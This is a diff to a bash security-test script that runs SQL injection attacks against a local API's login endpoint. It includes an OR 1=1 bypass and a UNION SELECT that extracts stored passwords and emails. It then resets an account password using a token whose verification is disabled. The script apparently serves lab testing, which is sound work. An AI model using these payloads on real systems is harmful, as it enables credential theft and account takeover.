@@ -1,6 +1,6 @@
 #!/bin/bash
    
-HOST_URL=http://localhost:5500/api
+HOST_URL=http://localhost:5600/api
 
 # Check if the CI environment variable is set to true 
 if [ -n "${CI}" ] && [ "${CI}" = "true" ]; then 
@@ -27,7 +27,7 @@ function test_sql_injection_login_endpoint_with_random_data() {
     echo "------------------------------------------------\n"
     echo "Testing SQL Injection by passing default data validation to access the login endpoint\n"
     echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{\"userName\":\"spammer\",\"email\":\"spammer@dropmail.cc \\\" OR 1=1 --;\",\"password\":\"johndoe1234\"}'\n"
-    curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{"userName":"spammer","email":"spammer@dropmail.cc \" OR 1=1 --; ","password":"John Doe"}'
+    curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{"userName":"spammer","email":"spammer@dropmail.cc \" OR 1=1 --; ","password":"johndoe1234"}'
 }
 
 
@@ -40,23 +40,23 @@ function test_sql_injection_to_retrieve_account_details() {
     # can retrieve the existing account login details using the below query
     jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }
 
-    token=$(curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "userName": "spammer" , "email": "spam@email.com\" union select password || \":\" || email from users;--" , "password": "pwd" }' | jq -j '.token')
-    jwt $token
-    json=$(jwt $token)
+    auth_token=$(curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "userName": "spammer" , "email": "spam@email.com\" union select password || \":\" || email from users;--" , "password": "pwd" }' | jq -j '.token')
+    jwt $auth_token
+    json=$(jwt $auth_token)
     password=$(echo "$json" | jq -r '.role' | cut -d':' -f1)
     export password=$password
-    export token=$token
-    echo $token
+    export auth_token=$auth_token
+    echo $auth_token
 }
 
 function test_jwt_verification_disabled() {
     echo "------------------------------------------------"
     echo "------------------------------------------------\n"
     echo "Testing Resetting the password of the retrieved account\n"
-    echo "curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d { \"token\": \"$token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }'\n"
+    echo "curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d { \"token\": \"$auth_token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }'\n"
     
     # local token=test_sql_injection_to_retrieve_account_details
-    curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d "{ \"token\": \"$token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }"
+    curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d "{ \"token\": \"$auth_token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }"
 
 }
 
